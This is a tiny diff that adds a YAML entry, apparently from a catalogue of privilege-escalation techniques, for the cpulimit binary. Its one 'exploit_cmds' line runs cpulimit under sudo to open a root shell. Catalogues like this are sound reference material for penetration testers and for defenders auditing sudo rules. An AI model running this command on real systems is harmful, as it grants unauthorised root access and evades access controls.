@@ -1,0 +1,4 @@
+name: cpulimit
+binary_path: /usr/bin/cpulimit
+exploit_cmds:
+- sudo /usr/bin/cpulimit -l 100 -f -- /bin/sh
